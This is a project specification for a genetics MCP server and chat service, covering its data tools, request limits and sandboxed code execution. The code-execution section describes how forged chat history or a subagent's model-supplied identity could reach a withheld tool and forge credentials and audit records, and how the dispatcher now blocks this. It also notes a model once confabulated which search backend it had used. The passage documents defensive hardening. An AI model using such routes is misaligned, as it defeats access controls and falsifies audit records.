# genetics-mcp-server - Project specification

## Introduction

genetics-mcp-server is a Model Context Protocol (MCP) server and LLM chat service that provides AI assistants and agents with tools to access human genetics data. The server also acts as a bridge between LLMs and a genetics results REST API, translating tool calls into API requests and formatting responses for AI consumption. External MCP servers such as those from gnomAD or Open Targets can also be added in the set of tools available.

## Purpose and Goals

- Provide an MCP server that exposes genetics data tools to AI assistants
- Enable agentic LLM interactions with genetics data through a FastAPI chat service
- Support multiple transport protocols (stdio, SSE, streamable HTTP) for flexible deployment
- Proxy tools from external MCP servers to aggregate genetics data sources
- Maintain clean separation between tool definitions, execution, and LLM integration

## Key Features

- **Standalone MCP Server**: Connects to Claude Desktop, Cursor, or any MCP client via stdio, SSE or streamable HTTP
- **LLM Chat API**: FastAPI service with streaming responses, supporting Anthropic and OpenAI providers
- **Genetics data tools**: Comprehensive access to GWAS, QTL, colocalization, expression, Mendelian disease data, LD, protein annotation, regulatory/functional genomics (open-chromatin atlases, allele-specific methylation, predicted variant effects, MPRA reporter activity), visualizations, and BigQuery for advanced queries
- **Literature and web search**: Integration with Europe PMC, Perplexity, Tavily, and DuckDuckGo
- **External MCP server proxying**: Aggregate tools from remote MCP servers (e.g., gnomAD, Open Targets Platform)
- **Optional IAP/oauth2-proxy authentication**: Protect the chat API via `X-Goog-Authenticated-User-Email` header
- **Per-user API tokens**: Users can create personal bearer tokens for MCP server access, with create/list/revoke management via the chat API
- **Per-user rate limiting**: Sliding window rate limit on chat requests, keyed by user email
- **Per-message size limits**: `_validate_latest_message` (in `chat_api.py`) caps the newest user message's typed-text length (`MAX_MESSAGE_CHARS`, default 50K) and attachment count (`MAX_ATTACHMENTS_PER_MESSAGE`, default 10), rejecting with HTTP 413 before any model call. `_validate_request_size` bounds the request as a whole — total text across **all** messages (`MAX_REQUEST_CHARS`, default 2M, images excluded) and message count (`MAX_MESSAGES_PER_REQUEST`, default 500) — because the per-message check only ever inspects the newest *user* message, leaving a client-sent assistant turn and every replayed history turn unbounded (`genetics-results-suite-e0u`). Applying the per-message cap to every message would have been the tighter rule and the wrong one: replayed tool results are routinely larger than any typed message, so it would reject ordinary long conversations. Attachments are excluded from the text cap: images arrive as `image` blocks and data files (TSV/CSV/Excel) are inlined by the frontend as text blocks prefixed `[File: <name>]` — both are counted toward the attachment limit, not the character limit. The frontend (`LLMChat.tsx`) mirrors these limits for immediate feedback. Bulk data should be attached as a file rather than pasted
- **File attachments**: Upload/download/delete endpoints in `routers/chat_history.py` store files on disk (`ATTACHMENT_STORAGE_PATH`) with metadata in the `chat_attachments` table. Files are classified as `image`, `tsv`, or `excel`. Excel is a binary format, so `.xlsx`/`.xls` uploads are parsed to TSV at upload time via `excel_to_tsv()` (polars `read_excel`, calamine/`fastexcel` engine; all sheets, each prefixed `# Sheet: <name>` when multiple) and the parsed text is stored as a `.tsv` sidecar (`text_path` column); a file that fails to parse is rejected with HTTP 400 and nothing is written. The download endpoint serves the original bytes by default, or the model-ready text via `?as=text` (parsed TSV for excel, original for tsv/csv). The live frontend send path does not round-trip through these endpoints — it parses Excel→TSV client-side with SheetJS (`excelToTsv.ts`) before inlining, so a first send needs no upload endpoint and therefore no session. (The original reason was stronger — sessions were created lazily *after* the first exchange, so there was no `session_id` to upload against at all. That is no longer true: `genetics-results-suite-vda` moved creation ahead of the request, because `run_analysis` refuses a turn whose `session_id` is null. The client-side parse is kept on its own merits, one fewer round trip.) The server-side parse is therefore defense-in-depth: it covers direct API consumers and guarantees stored bytes are never surfaced as binary; `?as=text` is available for any client that prefers a backend round-trip
- **Cost logging**: Estimated USD cost logged for every Anthropic API call based on token usage and model pricing
- **Context usage tracking**: `get_context_window()` in `cost.py` maps model name prefixes to context window sizes (tokens). During streaming, `usage` SSE events are emitted after each agentic loop iteration, enabling the frontend to display a live context usage progress bar
- **Chat history persistence**: SQLite-based storage of conversation threads. Assistant turns persist both their content blocks (`content_json`: text + `tool_use`) and the tool outputs (`tool_results_json`: the `tool_result` blocks). Persisting tool results means a **resumed** conversation replays the actual data the model saw, not just its prose summary — preventing factual drift across turns/sessions (see "Tool result persistence" under Architecture decisions)
- **Configurable prompts**: Per-user LLM configuration stored in database
- **Instructions**: Users store named sets of their own instructions and select one per chat; the chat request carries only the set id and the server appends the stored text to the system prompt as a second cached block (see "Instructions" below)

## Technical implementation considerations

- polars should be used to process tabular data from the genetics API
- matplotlib is used for generating scientific visualizations (PheWAS plots, etc.)
- Asynchronous code execution using async/await with httpx for HTTP calls
- The MCP server uses FastMCP from the mcp library for tool registration
- Tool definitions are shared between MCP server and LLM service via a common module
- Error responses from tools should include `success: false` and an `error` field
- Large tool results are truncated to prevent context overflow in LLM conversations
- External tool errors should not cause problems for the server or clients; log and return error response

## Available tools

### Search tools

| Tool | Description |
|------|-------------|
| `search_phenotypes` | Look up phenotype codes by disease/trait name |
| `search_genes` | Look up gene symbols and genomic positions |
| `lookup_variants_by_rsid` | Convert rsIDs to variant IDs (chr:pos:ref:alt format) |
| `lookup_phenotype_names` | Batch translate phenotype codes to human-readable names |
| `get_gene_group_members` | Enumerate member genes of an HGNC gene group / family by `group_id` or `group_name`, returning symbols + genomic coordinates. Olfactory receptors are **excluded by default** (`exclude_olfactory=true`) since they are GPCRs that dominate large families by count; pass `exclude_olfactory=false` for full membership. Calls the API (`GET /api/v1/gene_group/members`), not BigQuery. For whole-group BigQuery joins (e.g. cis-pQTL colocalizations for all GPCRs), prefer filtering `gene_annotations_v` on `gene_group_ids`/`gene_group_names` directly |
| `normalize_gene_symbols` | Resolve gene symbols / aliases / previous symbols to current approved HGNC symbols (exact, not fuzzy); returns mappings + unresolved inputs. Calls the API (`GET /api/v1/gene/normalize`), not BigQuery |

### Credible set tools (fine-mapped GWAS results)

| Tool | Description |
|------|-------------|
| `get_credible_sets_by_gene` | Get credible sets for variants near a gene (gene body ± `window`, default **500 kb**). The wide default is deliberate: the strongest signal attributed to a gene can sit several hundred kb away (e.g. a long-range regulatory variant), so a narrow window can silently drop the top hit |
| `get_credible_sets_by_variant` | Find associations containing a specific variant |
| `get_credible_sets_by_region` | Get credible sets overlapping a `chr:start-end` region across resources, for loci defined by coordinates rather than a gene or variant. Same `summarize` semantics as the by-variant tool; variant-level rows are capped at 500 inline with `truncated` set |
| `get_credible_sets_by_phenotype` | Get all GWAS associations for a phenotype |
| `get_credible_set_leads_by_phenotype` | One row per credible set: its lead variant (flagged lead, else highest PIP, ties by p-value). The cheap way to enumerate a trait's independent signals without pulling every member variant |
| `get_credible_set_by_id` | Get all variants in a specific credible set |
| `get_credible_sets_by_qtl_gene` | Get QTL associations where a gene is the molecular trait. `summarize` defaults to **true** (credible set-level), like the sibling credible-set tools — see Architecture decision 7. Also the correct tool for **gene-based caQTL** questions: a caQTL trait is a chromatin peak, and the underlying `all_cs_qtl_file` resolves the Open4Gene peak-to-gene link (cell-type-matched), so `trait` holds the linked gene symbol while `trait_original`/`cs_id` keep the peak id. Peak-vs-gene coordinate matching is NOT a substitute — linked peaks sit up to ~1 Mb away and most peaks near a gene are not linked to it |
| `get_credible_sets_stats` | Get summary statistics of credible sets for a dataset |

### Gene data tools

| Tool | Description |
|------|-------------|
| `get_gene_expression` | Get tissue-specific gene expression levels |
| `get_gene_disease_associations` | Get Mendelian disease relationships from ClinGen/GENCC |
| `get_exome_results_by_gene` | Get rare variant burden test results (genebass filtered to p < 1e-4, IBD exome-wide significant only) |
| `get_exome_results_by_variant` | Exome results for one specific variant across exome resources — the rare-variant counterpart to `get_credible_sets_by_variant` |
| `get_exome_results_by_region` | Exome results overlapping a `chr:start-end` region; rows capped at 500 inline with `truncated` set |
| `get_exome_results_by_phenotype` | Get exome variant results for a specific phenotype across all genes (genebass and IBD) |
| `get_gene_based_results` | Get gene-level burden test results from genebass, IBD, BipEx2, and SCHEMA (genebass rows filtered to p < 1e-4) |
| `get_gene_based_results_by_phenotype` | Get the complete unfiltered gene burden results for one phenotype — every gene and annotation class, no p-value cutoff |
| `get_nearest_genes` | Get genes nearest to a variant position |
| `get_genes_in_region` | Get all genes in a genomic region |

### Regulatory and functional genomics tools

Four evidence types that must not be conflated, because a user question about "regulatory effect" maps to a different one depending on wording: a measured accessibility **atlas** (`open_chromatin`), an accessibility **QTL** (caQTL, reached through the credible-set tools above), an **in-silico prediction** (`variant_effect`), and a **measured reporter assay** (`mpra`). Each tool description states which it is. The gene-keyed variants all select by genomic coordinates (gene body ± `window`, default **500 kb**) rather than by `gene_most_severe`, since most-severe-consequence attribution misses exactly the nearby regulatory variants these datasets are about.

| Tool | Description |
|------|-------------|
| `get_asm_qtl_by_variant` | Allele-specific methylation QTL (ASM-QTL) for a variant: associations with CpG/MDS methylation rates, effect sizes, methylation rate on reference vs alternative haplotype, primary/secondary variant rank. `resources`: `decode_cpg`, `decode_mds` |
| `get_asm_qtl_by_gene` | ASM-QTL for variants near a gene (gene body ± `window`) |
| `get_peak_to_genes`, `get_gene_to_peaks` | Open4Gene peak-to-gene **links** with the cell type each link was significant in — which gene a regulatory region acts on, and its inverse. This is what turns a caQTL peak id into candidate target genes; distinct from the open-chromatin atlas tools below, which measure accessibility and carry no link evidence |
| `get_open_chromatin_by_peak` | One atlas peak by its `chr-start-end` id, with every cell_type/tissue/condition row recorded for it |
| `get_open_chromatin_by_variant`, `get_open_chromatin_by_region`, `get_open_chromatin_by_gene` | Measured open-chromatin **atlas** peaks (scATAC/snATAC/bulk-ATAC/chromHMM) overlapping a variant position, a region, or a gene's window, labelled by `cell_type`, `tissue`, `life_stage` and `condition` so cell-type specificity can be reported. `resources`: `marderstein`, `li_brain_atac`, `catlas`, `epimap`, `calderon_immune`, `rosmap_brain` |
| `get_variant_effect_by_variant`, `get_variant_effect_by_gene` | In-silico **predicted** variant effect on chromatin accessibility: ChromBPNet (`model=chrombpnet`) per cell type/tissue with `score`/`mlog10p`/`quantile_rank`/`is_significant`, FLARE (`model=flare`) as a pan-context score with null cell type. `resources`: `marderstein` |
| `get_mpra_by_variant`, `get_mpra_by_region`, `get_mpra_by_gene` | **Measured** cis-regulatory allelic activity from a massively parallel reporter assay (Siraj et al. 2026). One long row per `cell_line` — `meta` (cross-cell-line meta-analysis) or K562/HEPG2/SKNSH/HCT116/A549 — carrying `emVar` (allele modulates reporter expression), `active`, `log2Skew` (signed allelic effect), `log2FC`, and their `*_mlog10p`. Coverage is partial (fine-mapped GTEx/UKBB/BBJ plus control common variants), so absence ≠ no effect. `resources`: `siraj_mpra` |
| `get_mpra_pip_concordance_by_gene` | Joins FinnGen fine-mapped credible sets (`credible_sets_v`, filtered to `resource` + `pip >= min_pip`, default 0.1) to the MPRA cross-cell-line meta row on the shared variant key, for variants near a gene — the regulatory-buffering check of whether credibly causal variants are measurably active. Ordered `emVar` then PIP. Distinct from `get_mpra_by_gene`, which returns MPRA rows without the PIP cross-reference |

### Other genetics tools

| Tool | Description |
|------|-------------|
| `get_colocalization` | Find traits sharing causal signals at a variant |
| `get_colocalization_by_credible_set` | Colocalizations of ONE credible set (resource + phenotype + `cs_id`), so the result is that signal's partners rather than everything at the position. `dual_format` returns both traits' columns |
| `get_resource_metadata` | Harmonized per-trait metadata for a resource (trait names, sample sizes, sub-studies of a collection) — the per-trait rows behind `list_datasets`' aggregates |
| `get_dataset_display_names` | Display-name overrides keyed by the raw `dataset` column value, for rendering results |
| `get_phenotype_report` | Get detailed markdown report for a phenotype. Disabled by default — enable with `ENABLE_PHENOTYPE_REPORT` |
| `list_datasets` | List all datasets with descriptions, provenance, sample-size stats, and supported products |
| `get_summary_stats` | Get summary statistics (p-value, beta, SE, allele frequencies) for specific variant-phenotype pairs |
| `get_summary_stats_by_region` | Every summary stat record in a `chr:start-end` region for one or more phenotypes — the full association profile of a locus, including sub-threshold variants credible sets omit. Phenotypes are REQUIRED (sumstats are stored per phenotype); rows capped at 500 inline |
| `get_hla_by_phenotype` | Every imputed classical HLA allele tested against one or more phenotypes (187 alleles across HLA-A/-B/-C/-DPB1/-DQA1/-DQB1/-DRB1/-DRB3/-DRB4/-DRB5, FinnGen R14) — the interpretable answer whenever a signal lands in the MHC, where SNP sumstats are unreadable because of the LD. Optional `genes` filter. Read `mlog10p`, not `pval` (it underflows to 0 at these effect sizes), and check `info`: a rare allele imputed below 0.5 yields a huge unstable beta that is an artifact |
| `get_hla_by_allele` | The inverse — every phenotype one HLA allele is associated with, across all 2,712 endpoints (a PheWAS of the allele; MHC pleiotropy across autoimmune traits is the norm). Goes through BigQuery `hla_associations_v` because the per-phenotype files results-api serves cannot span traits. Allele names are gene-stripped and two-field (`B*27:05`); a written `HLA-` prefix is stripped for the caller. Filtered to `min_info` 0.5 by default |
| `get_variant_annotations` | Get variant annotations (consequence, allele frequency, rsID, enrichment) by variant, region, gene, or batch variants |
| `get_myvariant_annotations` | Get clinical/functional annotations from myvariant.info (ClinVar, CADD, functional predictions, cancer data). Chat-backend only — excluded from MCP server |

### LD tools (FinnGen LD Server)

| Tool | Description |
|------|-------------|
| `get_ld_between_variants` | Get LD (r2, D') between two specific variants using FinnGen reference panel |
| `get_variants_in_ld` | Get all variants in LD with a query variant within a specified window |

### Visualization tools

| Tool | Description |
|------|-------------|
| `create_phewas_plot` | Create a PheWAS plot showing phenotype associations for a variant (returns base64 PNG) |
| `analyze_variant_list` | Analyze a list of variants for shared phenotype associations, QTL patterns, tissue enrichment, and nearest genes |

### BigQuery tools (fallback for complex queries)

| Tool | Description |
|------|-------------|
| `query_database` | Execute custom SQL against genetics views (fallback for queries specialized tools cannot handle) |
| `get_database_schema` | Get schema for BigQuery views before writing queries. Accepts optional `table` parameter to get just one table's schema. Returns resource metadata with aliases, column descriptions, allowed filter values, and example SQL queries |

BigQuery contains multiple tables beyond just credible sets — including exome/burden test results, colocalization, and more. The `get_database_schema` tool discovers all available tables.

A `gene_annotations` BigQuery table/view (built in `genetics-results-db`) is also exposed via `get_database_schema` and is the `query_database` surface for cis/trans QTL filtering — JOIN its gene coordinates to `colocalization_v` instead of hand-typing coordinate literals — and for any-group gene enumeration. This stands apart from the two specialized gene tools (`get_gene_group_members`, `normalize_gene_symbols`), which call the API and do **not** read this table. **Coordinate windows, not `gene_most_severe`, for "near a gene" queries**: when finding signals (GWAS or QTL) physically near a gene in BigQuery, JOIN `gene_annotations_v` for the gene body and filter on a coordinate window (≈ 500 kb), rather than filtering by `gene_most_severe`. The latter is per-variant most-severe-consequence attribution — unreliable for regulatory variants and prone to both missing nearby signals and mis-attributing distant ones. `get_asm_qtl_by_gene` now selects by this coordinate window, and the system prompt instructs the LLM to do the same for ad-hoc SQL. (`get_credible_sets_by_qtl_gene` is the exception: it finds QTLs where the gene is the *molecular trait*, correctly keyed by gene name.) Single source of truth split: the specialized tools resolve gene groups/symbols via the API; BigQuery's `gene_annotations` stands alone as the surface for SQL JOINs and ad-hoc enumeration. Views include a derived `resource` column that maps dataset names to resource identifiers (e.g., `FinnGen_R13` → `finngen`, `UKB_PPP` → `ukbb`, `Open_Targets_26.06` → `open_targets`). This allows filtering by `WHERE resource = 'finngen'` instead of matching dataset names directly. The schema response includes resource metadata with human-readable labels and aliases to help agents map user intent to correct filter values (e.g., "bipex" → `resource = 'bipex2'`). Collection resources like eQTL Catalogue are collapsed into summaries rather than listing hundreds of individual IDs.

### External search tools

The external search tools split into two conceptually distinct families:

- **Literature backends** (`search_scientific_literature`): query a paper-indexing API — either `europepmc` (covers PubMed, Europe PMC, bioRxiv, medRxiv) or `perplexity` (broader scientific web). Exactly one backend is queried per call; "backend" is the API hit, not the content source indexed.
- **Structured curated databases** (`search_mgi`, `search_cbioportal`): query a curated biological database that returns structured records (genes, phenotypes, alleles, orthologs; somatic alteration frequencies) rather than papers. Complements — does not replace — the literature backends.

**Backend selection is the user's, never the model's.** The tool schema exposes no `backend` parameter, so the model cannot request one; `LLMService._execute_tool` additionally strips any `backend` key the model invents anyway. Selection resolves in this order, first match wins: the request-level `literature_backend` in the chat API body (the web UI always sends it, defaulting to `perplexity`); then `LITERATURE_SEARCH_BACKEND`; then the built-in default `perplexity`. Europe PMC is therefore used only when the user explicitly selects it. Every response still carries a `backend` field naming the API that ran, and that field is what the model must report. (Earlier the model could pass its own `backend`, which the request-level value then silently overrode; the model narrated the backend it had asked for and confabulated hybrid labels around the mismatch. Removing the parameter removes the mismatch at its source.)

**Perplexity result metadata**: the Sonar response gives a `search_results` list (title, date, snippet, url) plus a prose `summary`; it carries no authors or journal. Records that expose a PMID, DOI or PMCID in their URL are therefore hydrated in one batched Europe PMC lookup (`_hydrate_literature_metadata`) filling authors/journal/year/title/abstract, so citations can be rendered as author-year markdown links. Hydration is best-effort — a Europe PMC failure leaves the Perplexity-supplied title/year/snippet intact. Each record reports `source: perplexity` (the API searched) and `metadata_source` (`perplexity` or `europepmc`, where the bibliographic details came from); hydration never changes which backend was searched.

| Tool | Description |
|------|-------------|
| `search_scientific_literature` | Search PubMed/bioRxiv via Europe PMC or Perplexity |
| `web_search` | General web search via Tavily or DuckDuckGo |
| `search_mgi` | Search Jackson Lab Mouse Genome Informatics for curated mouse gene→phenotype annotations, knockout/transgenic allele phenotypes, and human-mouse ortholog mappings. Chat-backend only — excluded from MCP server |
| `search_cbioportal` | Query cBioPortal for somatic alteration frequency in cancer cohorts: pan-cancer mutation/CNA frequency, breakdown by cancer type, hotspot protein changes, fusion partners, study lookup. Chat-backend only — excluded from MCP server |

#### MGI (native tool, chat-backend only)

The `search_mgi` tool queries Jackson Lab's MouseMine (InterMine REST endpoint) for curated mouse data: gene → MP-ontology phenotype terms, knockout/transgenic allele phenotypes, and mouse-human ortholog mappings. Unlike Europe PMC and Perplexity which return papers, MGI returns structured curated records — so it complements rather than substitutes for literature search. Excluded from the MCP server (mirroring `get_myvariant_annotations`); only available via the chat API.

#### cBioPortal (native tool, chat-backend only)

`search_cbioportal` queries the public cBioPortal REST API (`https://www.cbioportal.org/api`, no authentication for public studies) for somatic alteration frequencies across ~540 cancer studies and ~400,000 tumour samples. Six `query_type`s: `gene_summary` (pan-cancer mutation and copy-number frequency), `gene_by_cancer_type`, `gene_mutations` (recurrent protein changes), `gene_fusions`, `variant_hotspot` (recurrence at one residue), `study_search`. Excluded from the MCP server alongside `search_mgi`; chat API only. Data is ODbL-licensed, so every response carries an `attribution` field and `study_search` returns per-study citations and PMIDs.

**GRCh37/GRCh38 is the defining constraint.** 467 of 539 studies are hg19, and cBioPortal reports each record on its source study's build without lifting over — so its genomic coordinates cannot be compared against this suite's GRCh38 positions. Every query type therefore keys on gene symbol and protein change, which are build-independent. `gene_mutations` returns coordinates under a `coordinates_by_build` map that is never merged across builds, and every result carries a `genome_build_note` telling the agent to reach GRCh38 variants via `get_variant_protein_effect` (genomic → protein change) first. This is the same reasoning as the GRCh38 pin on `get_variant_protein_effect`: a coordinate carries no build, so silently mixing them answers for the wrong genome.

**Denominators are the other correctness trap.** Counting altered samples is easy; dividing by the right cohort is not. Three distinct denominators exist and were checked against cBioPortal's own published figures:

- `gene_summary` uses `/mutation-data-counts/fetch`, which is gene-panel aware — its `MUTATED + NOT_MUTATED` reproduces the authoritative `numberOfProfiledCases` exactly (EGFR: 17,483/366,522), and it also reports `not_profiled_samples`.
- `gene_by_cancer_type` uses `/clinical-data-counts/fetch` with `genomicProfiles: [["mutations"]]`. That restriction is load-bearing: without it the denominator counts every sample in the study including unsequenced ones (400,081 rather than 367,336) and every frequency comes out low. It is profile-level rather than panel-level, so its frequencies are lower bounds — stated in the `denominator_basis` field on each response.
- Cancer type comes from each sample's `CANCER_TYPE` clinical attribute, not its study's headline cancer type, because the large pan-cancer cohorts (MSK-IMPACT alone is ~10k samples) carry `cancerTypeId: mixed` and would otherwise vanish from every per-cancer-type row. Studies spell the same disease differently, so labels are folded on a punctuation- and case-insensitive key before counting.

**Response-size guard.** `/mutations/fetch` returns one record per mutated sample, so pan-cancer TP53 is ~142k records / ~100 MB. `gene_mutations` therefore pre-flights with `projection=META` (a `total-count` header, no body, ~0.4 s) and falls back to the TCGA PanCancer Atlas + MSK pan-cancer cohorts above `_CBIO_MAX_MUTATION_RECORDS` (25,000), which keeps TP53 at ~23k records. The result reports `scope`, `scope_note`, `total_mutation_records` and `records_analyzed` so a narrowed count is never mistaken for a pan-cancer one.

Study, molecular-profile and cancer-type-denominator lookups are cached on the executor for the process lifetime — they do not depend on the gene queried and change only when cBioPortal reimports data.

### External MCP server tools (proxied)

#### gnomAD MCP

Provides variant annotations, population frequencies, gene constraint/expression data, and pathogenicity interpretation from gnomAD. Server name: `gmd-agent`. Tools are registered without prefix. Five All of Us (AoU) tools are excluded via `EXTERNAL_MCP_EXCLUDE_TOOLS`.

Available tools (after exclusions):

| Tool | Description |
|------|-------------|
| `get_variant_details` | Variant details/summary |
| `get_variant_frequencies` | Population allele frequencies |
| `get_variant_summary` | Variant summary |
| `get_multiple_variant_details` | Batch variant details |
| `interpret_variant_pathogenicity` | Interpret variant pathogenicity |
| `analyze_variant_cooccurrence` | Phase relationship (cis vs trans) between variants |
| `analyze_variant_pext` | Proportion expressed across transcripts (pext) score |
| `get_gene_summary` | Gene summary including constraint scores |
| `get_gene_expression_summary` | Gene expression summary |
| `get_gene_variants` | Variants for a gene |
| `get_mendelian_gene_summary` | Mendelian disease gene summary |
| `get_region_variants` | Variants in a genomic region |
| `get_transcript_details` | Transcript details |
| `list_gene_transcripts` | List transcripts for a gene |
| `get_agent_info` | Agent information |

#### myvariant.info (native tool, chat-backend only)

The `get_myvariant_annotations` tool queries myvariant.info for clinical and functional variant annotations not available from gnomAD MCP or the local API. Provides ClinVar clinical significance, CADD deleteriousness scores, functional predictions (SIFT, PolyPhen2, MutationTaster), cancer annotations (COSMIC, CIViC), and dbSNP rsIDs. Excluded from the MCP server — only available via the chat API. gnomAD population frequency fields are excluded by default to avoid overlap with gnomAD MCP.

#### UniProt (native tools, chat-backend only)

Four tools give the agent direct protein-level annotation, replacing the `web_search(include_domains=['rest.uniprot.org'])` fallback that returned UniProt's JavaScript placeholder page and the parametric-memory recall that produced wrong accessions.

| Tool | Description |
|------|-------------|
| `get_protein_annotations` | Full UniProtKB entry for a protein resolved from a gene symbol or accession: metadata, residue-level features (domains, active/binding/metal sites, signal peptides, PTMs, and curated natural variants via `feature_types=['variant']`), sequence, isoforms, and cross-references. `include` selects result sections, `feature_types` filters features, `residue_range` restricts them to a region. Chat-backend only — excluded from MCP server |
| `map_protein_variants` | Map protein-level variant notation (e.g. `['P70A', 'G393A', 'R438H', 'W873C']` with `query='TPO'`) to genomic coordinates and rsIDs via the EBI Proteins API coordinate mapping. Attaches any curated UniProt natural variant (disease, dbSNP) sitting at the mapped residue. Chat-backend only — excluded from MCP server |
| `get_variant_protein_effect` | The genomic→protein direction: genomic coding SNVs (`chr:pos:ref:alt`, GRCh38) → amino-acid change plus curated UniProt/ClinVar annotation (consequence, disease, clinical significance, population frequency, dbSNP/ClinVar xrefs), via the EBI Proteins `variation/hgvs` endpoint. SNVs only; indels and non-coding SNVs return an explicit note, not a silent empty. Reviewed (Swiss-Prot) entries and isoforms only. Chat-backend only — excluded from MCP server |
| `search_uniprot` | Search UniProtKB by free text, keyword, or organism when the target protein is not yet known; `reviewed_only`, `fields`, `size`, and `count_only` control the result set. Chat-backend only — excluded from MCP server |

**Client layer** (`tools/uniprot.py`): `UniProtClient` wraps both `https://rest.uniprot.org` (entries, search, sequences) and `https://www.ebi.ac.uk/proteins/api` (protein↔genome coordinate mapping, genomic-HGVS variant effect) over the shared `httpx.AsyncClient`. It owns:

- **Identifier resolution** — a gene symbol is matched through three tiers (exact gene name → any gene name/synonym → free text); an accession-shaped input that does not resolve is retried as a symbol, because `P2RY12`, `B4GAT1`, `B3GNT2` and the `H2AC*`/`H2BC*` histone families are simultaneously valid accession patterns and gene symbols. Merged (secondary) and withdrawn accessions are reported as `stale_accession` / `inactive` rather than silently followed.
- **A resolution block on every result** — `accession`, `entry_name`, `protein_name`, `gene_names`, `organism`, `taxon_id`, `reviewed`, `match_basis`, `ambiguous`, `alternatives`. This makes a mis-resolved protein visible in the same result (an accession supplied for the wrong protein comes back with the gene names it actually names), and the system prompt requires the agent to check it before quoting any annotation.
- **A process-wide TTL cache** (`UNIPROT_CACHE_TTL`, default 24 h, monotonic-clock deadlines, LRU-bounded). UniProt releases at most weekly, so a long TTL is safe; setting the TTL to `0` disables caching.
- **Genomic-HGVS variant effect** — `get_variant_protein_effect` converts each `chr:pos:ref:alt` into a GRCh38 RefSeq genomic HGVS (`NC_0000NN.V:g.<pos><ref>><alt>`, from a pinned per-chromosome accession table) and looks it up through the EBI `variation/hgvs` endpoint. The assembly is pinned to GRCh38 — a variant id carries no build, and guessing one would silently answer for the wrong genome. Reviewed entries are distinguished from the TrEMBL predicted entries the endpoint also returns by their Swiss-Prot mnemonic `entryName` and non-`Predicted` protein existence.

**Exposure decision**: like `get_myvariant_annotations` and `search_mgi`, these are chat-backend only — their names are in the `_mcp_disabled` set in `mcp_server.py`, so they are never registered on the standalone MCP server. Category is `general`, so they survive the `api`/`bigquery`/`rag` profile split (protein annotation is orthogonal to all three), and `get_protein_annotations`, `map_protein_variants` and `search_uniprot` are in the `literature_review` skill's `extra_tools` so subagents doing gene/protein biology can reach them (`get_variant_protein_effect` is not — it answers a genomic-coordinate question rather than a literature one).

### Code execution tools

Tool halves of the sandbox design (`genetics-results-suite-4h6`). The sandbox itself is
not deployed, so `read_artifact` has nothing to read in any running service — and
**`run_analysis` is withheld entirely until `SANDBOX_ENABLED` is true**
(`genetics-results-suite-4h6.56`). The flag is a deployment fact, not a preference: with
no sandbox at `SANDBOX_URL` the transport fails as `SandboxUnavailable` with
`retryable: True`, which reads as a passing outage, while the system prompt tells the
model to *prefer* the tool — so an ungated deployment steers every turn into a tool that
always fails and asks to be retried. `settings.disabled_tools` carries the exclusion, so
it applies **before** the profile filter and no `tool_profile` (including the name-listed
`code` arm) can restore it, and because the prompt is assembled from the resolved tool
list the "Choosing How to Get Data" steering disappears with the tool rather than being
edited separately. Only `run_analysis` is gated: `list_capabilities` and `read_artifact`
are inert without a sandbox rather than broken by it, and neither is a tool the prompt
prefers. Enabling it means setting `SANDBOX_ENABLED=true` on chat-backend, the same value
db-api and results-api already gate sandbox-token verification on.

Withholding the name from the list is not sufficient on its own, so `_execute_tool`
refuses to dispatch anything in `settings.disabled_tools` before it resolves a handler —
the same allowlist shape `subagent.py` carries for the same reason. Without it the
`getattr(self.executor, tool_name)` lookup runs whatever the model names: `ChatMessage`
accepts raw content blocks and `_sanitize_tool_blocks` drops only *orphaned* `tool_use`,
so a client-supplied history containing a paired `run_analysis` `tool_use`/`tool_result`
survives verbatim and primes the model for a tool it was never given. The refusal is
`retryable: false` (`SandboxNotConfigured` for `run_analysis`, `ToolNotEnabled` otherwise)
because a withheld tool is a deployment fact and must not read as a passing outage.

| Tool | Description |
|------|-------------|
| `run_analysis` | Run one Python script in the sandbox and return what it printed. Takes `code` and an optional `timeout_s` (1–120, default 60) — **and no identity**: the authenticated user and the chat session id are injected by `llm_service._execute_tool`, which strips any same-named key the model emitted first. Image artifacts the script writes are fetched and shown to the user automatically (see below); every other artifact is listed but unreadable. Chat-backend only; not registered on the MCP server at all |
| `list_capabilities` | SDK catalogue, one module at a time (`genetics`, `client`, `errors`); omit the argument for an index of module names and their exports. **Every** response carries a `usage` line with the exact import statement — the only reachable statement of it, since the catalogue strips module docstrings and `sdk.__doc__` is where the line otherwise lives (`genetics-results-suite-706`). Signatures and docstrings are rendered from the live SDK objects with `inspect`, not from a checked-in copy, so a new dataset function appears without a doc edit and cannot drift. This is what makes the catalogue cost zero per-turn context: the model carries one tool description instead of a signature per data product |
| `read_artifact` | Read one named file from **this process's local artifacts directory** (`SANDBOX_ARTIFACTS_DIR`). Takes a bare artifact **name** — never a path, never an execution id. Text is returned inline (100k chars, `truncated` flag), binary base64-encoded with its content type; over 4 MiB is refused rather than cut, because a truncated PNG is garbage rather than a short answer. Its description states outright that it **cannot** retrieve a `run_analysis` artifact, matching that tool's `artifacts_note` — the sandbox's `GET /artifact` route exists but this tool does not use it, and the model cannot reach it at all. Chat-backend only — excluded from MCP server |

**All three are category `orchestration`**, not `general`: they hand work to another
runtime rather than fetching data, which is what `launch_subagents` is. The category by
itself excludes nothing — `TOOL_PROFILES` includes `orchestration` in both the `api` and
`bigquery` profiles, so it reaches three of the five subagent skills — so `subagent.py`
names all four orchestration tools explicitly:
`disabled |= {"launch_subagents", "run_analysis", "read_artifact", "list_capabilities"}`.
That name list, not the category, is what keeps a subagent from executing code, retrieving
another execution's artifacts or being told how to start one; `tests/test_subagent.py`
pins it. For `run_analysis` the exclusion is also a correctness point: a subagent has no
session of its own, and the session is what the per-execution credential is minted against.

**Dropping a tool from the list only stops it being offered — the dispatcher is what
enforces it.** `subagent.py:_execute_subagent_tool` used to resolve the model's
`tool_name` against the executor with `getattr`, so any executor attribute could be
called by naming it, whether or not the skill declared it — and a subagent's task text is
written by the main agent, which *does* have `run_analysis`. It now refuses (and logs at
`WARNING`) any `tool_name` absent from the set `_get_tool_definitions(skill)` produced for
that skill, which covers the local, sandbox and external branches at once. Without it the
`run_analysis` handler was reachable with a model-supplied `user`/`session_id`, which
`mint_execution_tokens` would have made the `sub`/`sid` of both per-execution JWTs and of
every audit record — the forgery the `llm_service` strip exists to prevent, on the same
tool. `tests/test_subagent.py::TestSubagentDispatchAllowList` pins the refusal, the
by-name case, and that a declared tool still dispatches.

#### What `run_analysis` returns, and why it is rendered rather than forwarded

`sandbox_client.execute` returns the supervisor's 200 body **unchanged**; the handler
rebuilds it field by field into `success` / `status` / `output` / `output_truncated` /
`artifacts` (+ `duration_ms`, `artifacts_omitted`), and on a non-`ok` status adds
